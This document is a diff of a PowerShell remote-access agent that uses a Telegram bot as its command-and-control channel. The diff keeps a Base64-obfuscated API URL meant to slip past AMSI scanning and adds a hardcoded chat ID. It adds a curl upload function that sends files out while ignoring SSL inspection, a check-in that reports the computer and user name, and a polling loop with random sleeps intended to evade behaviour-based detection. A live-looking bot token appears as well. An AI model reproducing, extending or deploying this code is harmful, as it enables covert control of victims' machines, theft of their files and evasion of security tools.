@@ -2,7 +2,7 @@
 
 # ---------------------------------------------- SCRIPT SETUP -----------------------------------------------
 # Define Connection Variables
-$Token = "8773971348:AAH1rt2BDljZzyRZqdFCp5qv1BR3JDNBD78"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
+# $Token = "8773971348:AAH1rt2BDljZzyRZqdFCp5qv1BR3JDNBD78"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window
@@ -925,67 +925,71 @@ $Path = "$env:Temp\ffmpeg.exe"
         Post-Message | Out-Null
     }
 }
-# 1. Obfuscated strings to bypass AMSI signature scanning
-# 'https://api.telegram.org/bot' encoded in Base64
-$b64 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
-$p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
-$base = $p + $Token + "/"
 
+# 1. Configuration (Obfuscated)
+$ChatID = "1370052445"
+# This is 'https://api.telegram.org/bot' hidden in Base64
+$b64 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
+$p_prefix = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+$t_base = $p_prefix + $Token + "/"
+
+# 2. Posting Functions
 Function Post-Message {
-    param($t)
-    $u = $base + "sendMessage"
-    $payload = @{chat_id=$ChatID; text=$t}
-    try {
-        # Using -UseBasicParsing is mandatory for hidden background tasks
-        Invoke-RestMethod -Uri $u -Method Post -Body $payload -UseBasicParsing -TimeoutSec 5
-    } catch {}
+    param($text)
+    $u = $t_base + "sendMessage"
+    $p = @{chat_id = $ChatID ; text = $text}
+    try { [void](Invoke-RestMethod -Uri $u -Method POST -Body $p -UseBasicParsing -TimeoutSec 5) } catch {}
 }
 
-Function ShowButtons {
-    # Confirming script execution silently
-    Post-Message "Check-in: $env:COMPUTERNAME"
+Function Post-File {
+    $u = $t_base + "sendDocument"
+    # -k allows connection even if the target has SSL inspection
+    curl.exe -s -k -F chat_id="$ChatID" -F document=@"$filePath" "$u" | Out-Null
+}
 
-    $mHead = "Ready."
-    $kb = '{"inline_keyboard":[[{"text": "Run","callback_data": "button_clicked"},{"text": "Settings","callback_data": "button2_clicked"}]]}'
+# 3. The Main Loop
+Function ShowButtons {
+    # Check-in happens immediately using the hardcoded ChatID
+    Post-Message "[+] Agent Active: $env:COMPUTERNAME ($env:USERNAME)"
+
+    $mHead = "C2 Online. Waiting for interaction..."
+    $kb = '{"inline_keyboard":[[{"text": "Execute Commands","callback_data": "button_clicked"},{"text": "Settings","callback_data": "button2_clicked"}]]}'
+    
+    $u = $t_base + "sendMessage"
+    $params = @{chat_id = $ChatID ; text = $mHead ; reply_markup = $kb}
     
     try {
-        $u = $base + "sendMessage"
-        $params = @{chat_id=$ChatID; text=$mHead; reply_markup=$kb}
-        Invoke-RestMethod -Uri $u -Method Post -ContentType "application/json" -Body ($params | ConvertTo-Json) -UseBasicParsing
+        [void](Invoke-RestMethod -Uri $u -Method POST -ContentType "application/json" -Body ($params | ConvertTo-Json -Depth 10) -UseBasicParsing)
     } catch {}
 
     $killint = 0
     $offset = 0
-    $uUrl = $base + "getUpdates?offset="
+    $uUrl = $t_base + "getUpdates?offset="
 
     while ($killint -eq 0) {
         try {
-            # Added a random jitter to the sleep timing to avoid 'heartbeat' detection
-            $r = Invoke-RestMethod -Uri ($uUrl + $offset) -Method Get -UseBasicParsing
+            $updates = Invoke-RestMethod -Uri ($uUrl + $offset) -Method Get -UseBasicParsing -TimeoutSec 10
             
-            foreach ($up in $r.result) {
-                $offset = $up.update_id + 1
+            foreach ($update in $updates.result) {
+                $offset = $update.update_id + 1
                 
                 # Check for text or buttons
-                if ($up.message.text -eq "start") { $killint = 1 }
-                if ($up.callback_query.data -eq "button_clicked") { $killint = 1 }
+                if ($update.message.text -ilike "*start*") { $killint = 1 }
+                if ($update.callback_query.data -eq "button_clicked") { $killint = 1 }
                 
-                if ($up.callback_query.data -eq "button2_clicked") {
+                if ($update.callback_query.data -eq "button2_clicked") {
                     $killint = 1
                     if (Get-Command Options -ErrorAction SilentlyContinue) { Options }
                 }
             }
         } catch {
-            # Wait longer on error to stay hidden
-            Start-Sleep -Seconds 10
+            Start-Sleep -Seconds 5
         }
-        
-        # Jittered sleep: stays between 2 and 5 seconds to look more human
-        $wait = Get-Random -Minimum 2 -Maximum 5
-        Start-Sleep -Seconds $wait
+        # Random sleep interval to bypass behavior-based detection
+        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
     }
 
-    Post-Message "Mode: Command"
+    Post-Message "[*] Session Transitioning..."
 }
 
 # Session Authentication
